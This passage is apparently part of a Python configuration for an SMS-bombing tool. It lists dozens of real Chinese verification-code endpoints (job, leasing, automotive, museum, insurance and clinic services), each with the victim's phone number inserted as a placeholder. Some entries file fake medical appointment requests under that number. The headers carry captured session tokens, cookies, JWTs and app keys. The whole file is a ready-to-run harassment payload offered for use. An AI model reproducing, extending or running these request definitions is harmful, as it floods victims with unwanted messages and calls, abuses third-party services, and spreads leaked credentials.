    "x-ca-signature-headers": "x-ca-appkey;x-ca-timestamp;x-ca-deviceid;x-ca-version",
    "x-ca-signature": "bH1OrFk9I4SQKqrLX13ftYwnngBKxy0+OXUVOZKhX8A="
  }
},
{
  "name": "job.sdjuliangnet.com",
  "url": "https://job.sdjuliangnet.com/yuanqiapi.php/index/sendsmsv2",
  "method": "POST",
  "data": {
    "userToken": "",
    "api_city": "",
    "api_device_id": "638375776674244",
    "api_net": "f0JjbkJKTx5DUH1eYnFL",
    "channel": "68",
    "tel": f"{phone}",
    "type": "1",
    "app_id": "8",
    "sub_channel": "",
    "api_ip_city": "上海",
    "api_version_code": "120",
    "api_dev": "eUVmdDZARwlBJXlIZHlKMTYHM1B6QWABR0tFCDZQf0IzIxUWQAJGVigSNXJARRMDFAZ5FGYkRUZEBEZQfRUzdw=="
  },
  "headers": {
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "api-prod-waf.hobby666.com",
  "url": "https://api-prod-waf.hobby666.com/api/v1/user/sms/sendSms",
  "method": "POST",
  "data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Device-Id": "bsdfb3c3d32981221bd",
    "Mobile-Brand": "OnePlus",
    "BlackBoxThird": "v2:/KkB6a3/g2263bvWpT/dgcaNMAl6qTgbFjjerDod+V+6E9ZXX6B+sab0/v5Dg3siSnDkeIwU1qvpiPlkZF7QrTSYt86wKHNF3NF4lNer8b6NJATgROePV6RwN/ARAmjLJwEdt7Vf/nvPCF5mMjiJaYJ2XxKeJPET0mVcfCiesQDKHuapUfjHsx1kgGIZ3kRZQuzcCotar2yqXTd47cTJKQUHV5PxOxFHDm4h71K8J7pF4mgb9jz4pMSkfWaadgSLBp8cxuXN87skSMxZihBETY+bSVxk3xkGidCsGB4fFrue8AP72kHXTRbpPg==",
    "OS": "Android",
    "Network-Env": "wifi",
    "Build-Version": "2.5.4",
    "Pkg-Delivery-Code": "939",
    "Mobile-Type": "PJE110",
    "API-Version": "2",
    "Oa-Id": "4564E3093A48499BA7A4710A4828D422ccfe7242ebe236d3fb4d6d6534440ec7",
    "OS-Version": "15",
    "Juliang-AndroidId": "db588434695d7862",
    "agenttype": "native",
    "ANDROID-ID": "db588434695d7862",
    "wToken": "0004_98102F8FE7302840FD5D104CEFF7B41FC0D3EC55A6F3885540C7CC4A8465661DC54E884BCE936A38D8F76D498AAD1514FBE03D26BB7A/RfGVMDucVAIYAIoG3Ik7RH5kvFJvI4s6Ge7PRhfDJFvNU9/2Ggxc0Agovi+xBOjI3TfROXJ9jqw+ynwHzQ42SSoMIydSt3x5wpZAVmd4aJC/Kj/EXxBL/RbMEZBFPFDLDJnvR1tQnDXtsuTGjCa8jyeGw9osGK1kxTBKWPWVTHhUbXUKR5miy68urZJ5c0Q7cPhyIUoorvfTLZj0rq2V7uUCZ4yQHw5+mdpfb12SHPcqI2pCOns/GIKcUm5g8APcQioaB2W1gOXJ5CkgE8CPdLHDxg6Wdrgt4YBeNB/85wcApJZddqQtwZqGD2ehH94NRx83wwGEwAzx9vBGr2htvi/3a1UUDy7somqVVV+SVIU7ZTGKw9+KUwJFbt8+VZqy0SoYVl2Dhmvs29+32Nzn2tGtT4D6c2rzvpJnak1FljjGa10ERfNKTWyRxPnHriEONUIMmzPnGF30r5w2AUqu1Rn2Yqxb/YNstnuFOZBaeUO7RMy5KqrZrJQtBDl9PpFZ01yTsfGPvmRU9JXkc8hVtdigJ1hwgOEduy6rOUhNCY=_fHx8_7cd7f123d0544a58-h-1752618197303-f59925cf6c5f443cb9e9cd0f38a81799",
    "Cookie": "acw_tc=0aef811617526182233113472e00611f8f76c3b7d6223e24a05f832ce3e2fe"
  }
},
{
  "name": "api.ruguoapp.com",
  "url": "https://api.ruguoapp.com/1.0/users/getSmsCode",
  "method": "POST",
  "json_data": {
    "areaCode": "+86",
    "mobilePhoneNumber": f"{phone}",
    "action": "PHONE_MIX_LOGIN"
  },
  "headers": {
    "Content-Type": "application/json",
    "os": "Android",
    "os-version": "35",
    "app-version": "7.56.6",
    "app-buildno": "2872",
    "manufacturer": "OnePlus",
    "model": "PJE110",
    "resolution": "1264x2780",
    "market": "oppo",
    "applicationid": "com.ruguoapp.jike",
    "x-jike-app-id": "XeITUMa6kGKF",
    "x-jike-device-id": "802df164-7293-437b-936f-81ece4981578",
    "x-jike-access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiVDRpOStoQW1DMHMzRWk3VG9NYWVwXC83WXNuYTRiS1A4Qm9ObCtDXC8ramZ6UTlFNFB6YlU5bExTZldPQlpQcWdMVmZmTWxTUGZxZFRPVWRCU29lSDMrQ2hFVU5VV1R2bDVsQTd3N1RaRFREeHlDUG9mZlI1aWlCNEVKM2RPUktDaEZxdjBcL1JiYnMxTVNET3g0QzIyWUFLOHpxbExOUmJLaHFcL2djcW02bFwvcnFEVjkzNWdIODJDb3lDd2VQcElKV1BRMHRVcktUY042QTJBMUJIbHVFRkNNZ011VUpQaklUYks1ME9cL04yK25acXRnWUlJRjFcL1J6aFQ0NXVDQmt6V3NKeFQxRXNIa25BVnhlMTltTTA4STljZ0UrdEFJcnF3bTJRaTBmWVZsOEdhc0h2U2hPQ05zYkhuUVhZUzI2ZWx4aWpcL1wvRVo0c1hFdEtiYXh1eHlTRUpDVUFzcmR2VDZzdXFiUlVkNVVHTEo5RVRsZFFsOHkzVEpwVHl5MnBrM1lyXC8wSkRFMVB4OXhaNXRSKzZISVl5bDZMYk1jUW52cnRLWHUrd1lNdXg4UWs9IiwidiI6MywiaXYiOiJaZ3F4aElla0lkNCtOK1ZCUk1ETW9nPT0iLCJpYXQiOjE3NTI2MTg1NDkuMzI4fQ.Mnh5bVraNW0lu8i3AHWfZ8ESPA2bWEDG2A5Qa4EWvCs"
  }
},
{
  "name": "zszh-tech.com",
  "url": "https://www.zszh-tech.com/eao/api/get/mini/code",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "type": 1
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxee1939d0018ddce8/26/page-frame.html",
    "Cookie": "SESSION=ZDU0NTZhYmUtNDA1Ni00NGU2LTgxYjgtMjNiNGQ5Y2I2MzZh"
  }
},
{
  "name": "dynamicxa.snca.com.cn",
  "url": "https://dynamicxa.snca.com.cn/dynamic/API/resource/rest/v2/applet/phoneCode",
  "method": "POST",
  "json_data": {
    "userName": "yang003",
    "appKey": "31363133393737393338333831393737",
    "nonce": "LwDeWMrohKeTR4XsyPSBfOle78bMzill",
    "createTime": "20250716074512",
    "passwdDigest": "68b8693ef8fb97750e44d65838b45581a4175062217ce07a269154cdea534028",
    "parameter": {
      "mobilephone": f"{phone}"
    }
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx9aa37be5f5c5edee/1/page-frame.html"
  }
},
{
  "name": "wxxcx.lnmuseum.com.cn",
  "url": "https://wxxcx.lnmuseum.com.cn/singleMuseum/wx/auth/regCaptcha",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxbfd435ee3ff3d54b/23/page-frame.html"
  }
},
{
  "name": "nft-baas.cmft.com",
  "url": "https://nft-baas.cmft.com/nft-app/sms/send",
  "method": "POST",
  "json_data": {
    "phoneNum": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "useNativeProxy": "[object Boolean]",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx0be8c2481b387bf2/16/page-frame.html"
  }
},
{
  "name": "gate.mp.porsche.cn",
  "url": "https://gate.mp.porsche.cn/cnid-uniportal-service/api/v1/verification/send-code",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "clientId": "PF348876"
  },
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?1",
    "tenant-id": "PF348876",
    "origin": "https://myportal.porsche.cn",
    "x-requested-with": "com.tencent.mm",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://myportal.porsche.cn/",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i"
  }
},
{
  "name": "shinerayfl.com",
  "url": "https://shinerayfl.com:44380/Register/RegisterSendSmsCode",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "sender": "鑫源租赁",
    "receiver": "微信小程序",
    "smstemplate": "公众号注册验证码"
  },
  "headers": {
    "Host": "shinerayfl.com:44380",
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxd356ceb62d1524d1/31/page-frame.html"
  }
},
{
  "name": "pf.tsflc.com",
  "url": "https://pf.tsflc.com/api/auth/sendLoginSms",
  "method": "POST",
  "params": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "Authorization": "undefined",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?1",
    "LsAuthorization": "undefined",
    "Origin": "https://pf.tsflc.com",
    "X-Requested-With": "com.tencent.mm",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
  }
},
{
  "name": "aflmin-api.xiaopeng.com",
  "url": "https://aflmin-api.xiaopeng.com/mini/auth/sms",
  "method": "POST",
  "json_data": {
    "phone": f"{encrypt_phone(phone)}",
    "encryptMode": "1"
  },
  "headers": {
    "Content-Type": "application/json",
    "Client-Type": "PC",
    "platform-type": "WEAPP",
    "auth-token": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyU3RhdHVzIjoxLCJ1c2VyVHlwZSI6IldlQ2hhdCIsImlkIjoiMTk0NjM3NjczMDAxMjQ1OTAwOSIsImp0aSI6ImY5YmVmY2RmLTc2NGUtNDI0NS1hYTU4LWMwMjFhNjVkYzc5ZCIsIm5iZiI6MTc1Mjg4NzM0OSwiZXhwIjoxNzYwNjYzMzQ5fQ.PHoUfLCLIQQe3DcEY88EkPWOi69wo2660xE0mJiaY2Q",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxf1fa7a93e87226a6/35/page-frame.html"
  }
},
{
  "name": "mp.xingbangfl.com",
  "url": "https://mp.xingbangfl.com/api/mp/wxmp/login/msg/send/login",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "x-mp-token": "",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx507de5c5ca567e72/67/page-frame.html"
  }
},
{
  "name": "ylspfk.chailease.com.cn",
  "url": "https://ylspfk.chailease.com.cn/gate/ms-rddc-video-api/api/v1/tencent-sms-info/permit_endpoint/send-msg",
  "method": "GET",
  "params": {
    "phone": f"{phone}",
    "captcha": "",
    "type": "2",
    "tenantId": "1125812057146527744"
  },
  "headers": {
    "Accept": "application/json",
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx17849a05586d95fd/11/page-frame.html"
  }
},
{
  "name": "wechatminiapp.lsh-cat.com",
  "url": "https://wechatminiapp.lsh-cat.com/api/Repair/access/SentVerificationCode",
  "method": "POST",
  "json_data": {
    "Telphone": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "token": "2da02a0acff14502a15aed61497ffada",
    "timestamp": "1752890150773",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxe3c42da40c0669f0/125/page-frame.html",
    "Cookie": "acw_tc=1a0c39a017528901622811694e006d4c2d7ebaad6f304d6a33fa0b257cf892"
  }
},
{
  "name": "rhez.cpirhzl.com",
  "url": "https://rhez.cpirhzl.com/rhez/oauth/getPhoneCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "unionId": "ohgxp60HFdxtCFUuWlr3kfj9q_Fk",
    "_t": 1752890546566
  },
  "headers": {
    "Content-Type": "application/json",
    "token": "e50ead33a4c74e49bb29905c193e4444",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx6c867d1d6d428028/58/page-frame.html"
  }
},
{
  "name": "retail-finance-csite.souche.com",
  "url": "https://retail-finance-csite.souche.com/repayBindApi/sendCode",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "gt_version": "1.0.1",
    "gt_env": "WEAPP",
    "_security_token_inc": "31_3xzS_user687b0323e4b093d21f8a7c5a",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wxa1126dd6280e94e8/2/page-frame.html",
    "Cookie": "acw_tc=0b32825617528922153897807efb617ba2a2243e68e90a9139b1f4548b5a17; JSESSIONID=932D76B70744A0784931A493C31A9C41"
  }
},
{
    'name': "GUANGDA-FUTURES-SMS",
    'func': guangda_futures_send_sms,  # 单手机号函数（主配置，适配多接口统一调用）
    'args': [phone]
},
{
  "name": "gateway-mmp.ca-sinfusi.com",
  "url": "https://gateway-mmp.ca-sinfusi.com/cuaa-controller/cuaa-webservice/userLogin/getSmsRegisterCode",
  "method": "GET",
  "params": {
    "mobileNo": f"{phone}"
  },
  "headers": {
    "content-type": "application/json",
    "x-c-token": "",
    "x-amp-appid": "3f1a352db5a24c3f8d8a5282000a4983",
    "x-amp-appkey": "22c4dc153cdc01b48f42a77b7699a345",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx37b478f201f55080/12/page-frame.html",
    "Cookie": "HWWAFSESID=1871773f4d31a9b1ed; HWWAFSESTIME=1752892489712; JSESSIONID=2BD65B80385E28145226369169C394AB; x-client-id=CLIENT-XK0G8HFZVHXG9D4V"
  }
},
{
  "name": "calc.qianhuileasing.com",
  "url": "https://calc.qianhuileasing.com/butler/open/user/send-code",
  "method": "GET",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "content-type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxbedf820db08a24da/30/page-frame.html",
    "Cookie": "SESSION=false"
  }
},
{
  "name": "wxweb.huashenghaoche.com",
  "url": "https://wxweb.huashenghaoche.com/hshcwxweb/user/bindPhone/getCode",
  "method": "GET",
  "params": {
    "imageCode": "",
    "phone": f"{phone}",
    "imageId": "",
    "uid": ""
  },
  "headers": {
    "token": "",
    "content-type": "application/x-www-form-urlencoded",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx84b2c08c79130ac9/65/page-frame.html"
  }
},
{
  "name": "dzht.ensignhi.com",
  "url": "https://dzht.ensignhi.com:8002/contract/openApi/h5/common/getVerifyCode",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}",
    "encryptData": "wzRvPHWwgzqu9/0MEqALhmAU14WbyQHu1bdsT1WhDpjjMlRFNGHM4ErHqK/MqSjs"
  },
  "headers": {
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?1",
    "Origin": "https://dzht.ensignhi.com:8002",
    "X-Requested-With": "com.tencent.mm",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://dzht.ensignhi.com:8002/contract/h5/index.html",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
  }
},
{
  "name": "retail-finance-csite.souche.com",
  "url": "https://retail-finance-csite.souche.com/repayBindApi/sendCode",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "gt_version": "2.0.0",
    "gt_env": "WEAPP",
    "_security_token_inc": "31_naTK_user687b0e7de4b041af17038d15",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx5c61cb74a744fdbf/5/page-frame.html",
    "Cookie": "acw_tc=0b32825617528951182374200efa7a567831630b2bd7c962ab7e4418b06b76; JSESSIONID=4C50EFEADEC978E39B7630CF20A48221"
  }
},
{
  "name": "leasing.cf-finance.com",
  "url": "https://leasing.cf-finance.com/customer/api/sendVerifyCode",
  "method": "POST",
  "json_data": {
    "mobileNo": f"{phone}",
    "businessType": "bind"
  },
  "headers": {
    "Content-Type": "application/json",
    "tianzhen-session-key": "2b016039-36dd-4502-baaf-686cd41d8a3f",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx6e910f0ce65623ce/10/page-frame.html"
  }
},
{
  "name": "vega.huoyunren.com",
  "url": "https://vega.huoyunren.com/v2/isnb-openapi-proxy/auth/router",
  "method": "POST",
  "params": {
    "method": "ntocc-contract.contract.sendVerificationCode",
    "accessid": "br278dj",
    "sign2": "MvTaB+zLPgeUX1GoQPT5Bpm8SkU=",
    "appclientenv": "product",
    "appclientversion": "4.9.7",
    "g7timestamp": "1759147899390",
    "ua": "wx-android"
  },
  "data": {
    "phone": f"{phone}"
  },
  "headers": {
    "x-b3-traceid": "997e443674524e6baf85973c1c6bb754",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx42f6d9293d7f4cf8/279/page-frame.html"
  }
},
{
  "name": "wlhy.gsh56.com",
  "url": "https://wlhy.gsh56.com/wlhyapi/getSmsCode",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "productKey": "weapp-wlhy-vhc",
    "session3rd": "b2ec64dd-c00e-4d4e-8b4b-329e6f202083"
  },
  "headers": {
    "product": "app-wlhy-vhc",
    "imei": "ss-682eb2a2-908f-4c27-8796-97cdca8aa530",
    "osVersion": "wechart-OPD2404",
    "ip": "111.38.169.240",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxd4f0bf6c3116ffaf/57/page-frame.html",
    "Cookie": "SHAREJSESSIONID=ss-682eb2a2-908f-4c27-8796-97cdca8aa530"
  }
},
{
  "name": "safe.ysjdaijia.com",
  "url": "https://safe.ysjdaijia.com/XiaoChXuRequestVerifyCode.action",
  "method": "GET",
  "params": {
    "clientPhone": f"{phone}"
  },
  "headers": {
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxf2c2f6f1194cbaf8/1/page-frame.html"
  }
},
{
  "name": "jjtransport-app.jjjsy.cn",
  "url": "https://jjtransport-app.jjjsy.cn/driver/interviewApplicants/verificationCode",
  "method": "GET",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "content-type": "application/json",
    "request-type": "applets",
    "accept-language": "zh-CN",
    "request-id": "1759150090771",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx7bd68d667297e18f/70/page-frame.html"
  }
},
{
  "name": "anapi.annto.com",
  "url": "https://anapi.annto.com/api-mobile/driver/logout/sendMsgCode",
  "method": "GET",
  "params": {
    "driverPhoneNo": f"{phone}"
  },
  "headers": {
    "accessToken": "0ABB67A37F7984D30234A2E3EC563FA88BA8F2033041C6D6122203DB3B4308EEF87BBBB941B60E236AB5F52EF312011BF918C2004D71027FAF6C90CF92F191EEB97BE3E85CF465EAA39339E3DDDAE7C0367086E3E9C4DBCD6E36104616A825AF16D43D26D628F6E7D211BFA6B85FE9188F55A6581509DDEC88C1A42309136E0D2656BBEF725906E9DAA4AC7C2C7A2E79C742D987C372B9D69B86926656408FA9422E2716D010675A7A1D68E3687624C65E3DDB910A05AA92E215DB6BFAD685667C1BEB59D59802BF6F5E572CDB93229E8749A199F40A02EC2A838EEBF4008887C08642D4AF9A646D16D2B3C78A5840B350168503837BB4BC5AAEF3647412C3F5",
    "User-Agent-App": "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Safari/537.36 XWEB/1380215 MMWEBSDK/20250804 MMWEBID/9205 MicroMessenger/8.0.63.2920(0x28003F3A) WeChat/arm64 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
    "X-Device-Info": "%7B%22phoneUuid%22%3A%2213524501748%22%2C%22mobile%22%3A%2213524501748%22%2C%22channel%22%3A%22CYSAPPLET%22%2C%22phoneVersion%22%3A%22Android%2015%22%2C%22phoneNetwork%22%3A%22wifi%22%2C%22phoneBrand%22%3A%22OnePlus%22%2C%22channelCode%22%3A%22annto%22%2C%22phoneOs%22%3A%22Android%2015%22%2C%22appVersion%22%3A%224.0.54%22%2C%22phoneModel%22%3A%22OPD2404%22%2C%22appVersionNumber%22%3A0%2C%22businessNo%22%3A%22%22%2C%22lngLat%22%3A%22%22%2C%22address%22%3A%22%22%7D",
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx7000beb503823f9f/58/page-frame.html"
  }
},
  {
    "name": "wx.hy021.net",
    "url": "https://wx.hy021.net/api/mb1001/guahao",
    "method": "POST",
    "json_data": {
      "data": {
        "type": 2,
        "name": "复发人",
        "age": "28",
        "phone": f"{phone}",
        "detail": "犹豫",
        "gender": "男",
        "sex": 1,
        "doctor": "韩向东"
      },
      "appid": "f12f7735-e9d0-11ef-801e-b8cef617a30e"
    },
    "headers": {
      "Host": "wx.hy021.net",
      "Connection": "keep-alive",
      "charset": "utf-8",
      "appid": "f12f7735-e9d0-11ef-801e-b8cef617a30e",
      "content-type": "application/json",
      "Accept-Encoding": "gzip,compress,br,deflate",
      "Referer": "https://servicewechat.com/wxa200bff039deb407/1/page-frame.html"
    }
  },
  {
    "name": "y.120cjyy.com",
    "url": "https://y.120cjyy.com/addons/yiliao/api.common/yuyue",
    "method": "POST",
    "data": f"jzrid=0&name=伊云云&mobile={phone}&sex=男&age=45&doctorid=34&mendianid=1&date=2025-08-16&times=14:00-17:00&desc=犹豫&paytype=",
    "headers": {
      "Host": "y.120cjyy.com",
      "Connection": "keep-alive",
      "charset": "utf-8",
      "content-type": "application/x-www-form-urlencoded",
      "sessionid": "zwCV2PU9d+Vd51eiN9hR5w==",
      "Accept-Encoding": "gzip,compress,br,deflate",
      "lang": "zh_cn",
      "token": "53a06615f316b9030cdc7",
      "Referer": "https://servicewechat.com/wxf78d018f378582d3/37/page-frame.html"
    }
  },
  {
    "name": "wx.hy021.net",
    "url": "https://wx.hy021.net/api/mb1001/guahao",
    "method": "POST",
    "json_data": {
      "data": {
        "type": 2,
        "name": "伊云云",
        "age": "28",
        "phone": f"{phone}",
        "detail": "犹豫",
        "gender": "男",
        "sex": 1,
        "doctor": "李卫红"
      },
      "appid": "7419c38f-4c18-11f0-801e-b8cef617a30e"
    },
    "headers": {
      "Host": "wx.hy021.net",
      "Connection": "keep-alive",
      "charset": "utf-8",
      "appid": "7419c38f-4c18-11f0-801e-b8cef617a30e",
      "content-type": "application/json",
      "Accept-Encoding": "gzip,compress,br,deflate",
      "Referer": "https://servicewechat.com/wx75bc93407e475cd0/1/page-frame.html"
    }
  },
  {
    "name": "wx.hy021.net",
    "url": "https://wx.hy021.net/api/mb1001/guahao",
    "method": "POST",
    "json_data": {
      "data": {
        "type": 2,
        "name": "伊解口",
        "age": "38",
        "phone": f"{phone}",
        "detail": "抑郁",
        "gender": "女",
        "sex": 2,
        "doctor": "徐志芬"
      },
      "appid": "bb3e262d-85dc-11ef-801e-b8cef617a30e"
    },
    "headers": {
      "Host": "wx.hy021.net",
      "Connection": "keep-alive",
      "charset": "utf-8",
      "appid": "bb3e262d-85dc-11ef-801e-b8cef617a30e",
      "content-type": "application/json",
      "Accept-Encoding": "gzip,compress,br,deflate",
      "Referer": "https://servicewechat.com/wxb386b1f498276e7e/1/page-frame.html"
    }
  },
  {
    "name": "51hicard.com",
    "url": "https://www.51hicard.com/api/v1/sms/getValidateSendPeriod",
    "method": "POST",
    "json_data": {
      "type": "html",
      "mobile": f"{phone}",
      "agent": ""
    },
    "headers": {
      "Host": "www.51hicard.com",
      "Connection": "keep-alive",
      "YX-VersionName": "8.0.2",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
      "sec-ch-ua-mobile": "?1",
      "YX-Timestamp": "1755266617894",
      "YX-source": "h5",
      "Content-Type": "application/json; charset=UTF-8",
      "YX-Version": "802",
      "YX-tokenType": "1",
      "Origin": "https://www.51hicard.com",
      "X-Requested-With": "com.tencent.mobileqq",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://www.51hicard.com/landingPage/page?code=gzbb1003&page_name=cz-gzbbml&isAlipay=1&hfqorigin=hfq06117000000520000",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  
  {
    "name": "dxmbaoxian.com",
    "url": "https://www.dxmbaoxian.com/juhe/insurface/consultant/sendVerificationCode",
    "method": "POST",
    "json_data": {
      "from": "36",
      "tagId": "",
      "channelId": "dxmjr_H5-shouye-dakapian1",
      "sourceChannel": "shareMSG_wx-service-xiaochengxu-1005",
      "timestamp": 29239535,
      "wxAccessCode": None,
      "sessionId": "a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495",
      "errTimes": 0,
      "syncStokenTime": 0,
      "currentSyncTimes": 0,
      "did": None,
      "phone": f"{phone}"
    },
    "headers": {
      "Host": "www.dxmbaoxian.com",
      "Connection": "keep-alive",
      "sec-ch-ua-platform": "\"Android\"",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxdde36ae788f0bd5c",
      "Accept": "application/json, text/plain, */*",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "Content-Type": "application/json;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "Origin": "https://www.dxmbaoxian.com",
      "X-Requested-With": "com.tencent.mm",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://www.dxmbaoxian.com/s/product?itemId=2000000356&channelId=dxmjr_H5-shouye-dakapian1&sourceChannel=shareMSG_wx-service-xiaochengxu-1005",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "zhongmin.cn",
    "url": "https://m.zhongmin.cn/Topic/AddYuyueNew",
    "method": "POST",
    "data": "name=%E6%95%91%E8%B5%8E&phone={phone}&sex=0&type=1306&des=%E6%83%A0%E6%B0%91%E4%BF%9D%E9%9A%9C%E9%A2%84%E7%BA%A6",
    "headers": {
      "Host": "m.zhongmin.cn",
      "Connection": "keep-alive",
      "sec-ch-ua-platform": "\"Android\"",
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxf6715f305a746068",
      "Accept": "*/*",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "Origin": "https://m.zhongmin.cn",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://m.zhongmin.cn/benefitGuarantee/Index?&miniprogram=1&isarticle=0&miniphone=&cityid=&openid=o_-GO4k4GF7wKK1edUGK-e3YKxtI&areaCode=",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "xiaoyusan.com",
    "url": "https://www.xiaoyusan.com/Phonecrm/createOuterActNoLogin",
    "method": "POST",
